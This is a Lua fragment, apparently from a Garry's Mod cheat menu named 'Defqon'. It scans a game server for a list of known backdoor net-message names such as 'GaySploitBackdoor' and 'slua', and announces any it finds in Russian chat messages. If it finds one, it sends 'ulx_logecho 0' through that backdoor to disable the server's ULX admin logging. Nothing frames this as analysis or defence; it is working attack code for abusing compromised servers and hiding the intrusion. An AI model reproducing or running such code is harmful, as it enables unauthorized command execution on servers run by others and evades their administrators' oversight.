			if( NetValidString("pjHabrp9EY") ) then
        netKey = "pjHabrp9EY"
    else
	end
			if( NetValidString("_Raze") ) then
        netKey = "_Raze"
    else
	end
			if( NetValidString("m9k_explosionradius") ) then
        netKey = "m9k_explosionradius"
    else
	end
			if( NetValidString("gag") ) then
        netKey = "gag"
    else
	end
			if( NetValidString("_cac_") ) then
        netKey = "_cac_"
    else
	end
			if( NetValidString("_Battleye_Meme_") ) then
        netKey = "_Battleye_Meme_"
    else
	end
			if( NetValidString("ULogs_B") ) then
        netKey = "ULogs_B"
    else
	end
			if( NetValidString("arivia") ) then
        netKey = "arivia"
    else
	end
			if( NetValidString("_Warns") ) then
        netKey = "_Warns"
    else
	end
			if( NetValidString("striphelper") ) then
        netKey = "striphelper"
    else
	end
			if( NetValidString("m9k_explosive") ) then
        netKey = "m9k_explosive"
    else
	end
			if( NetValidString("GaySploitBackdoor") ) then
        netKey = "GaySploitBackdoor"
    else
	end
				if( NetValidString("_GaySploit") ) then
        netKey = "_GaySploit"
    else
	end
				if( NetValidString("slua") ) then
        netKey = "slua"
    else
	end
				if( NetValidString("Bilboard.adverts:Spawn(false)") ) then
        netKey = "Bilboard.adverts:Spawn(false)"
    else
	end
					if( NetValidString("awarn_remove") ) then
        netKey = "awarn_remove"
    else
	end
						if( NetValidString("R8") ) then
        netKey = "R8"
    else
	end
    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "–ë—ç–∫–¥—É—Ä–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ." )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 0, 255, 0 ), "–ù–∞–π–¥–µ–Ω .net Backdoor: ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("sinelt") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs –û—Ç–∫–ª—é—á–µ–Ω—ã." )
                end)
            end
    end

local function gmsg(msg,color)
if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 150,0,0 )," ".. msg) return end
if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 255,0,0 )," ".. msg) return end
if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 43,255,0 )," ".. msg) return end
chat.AddText( "",Color( 255,0,0 ),"[Defqon] ",Color( 255,255,225 )," ".. msg)
end

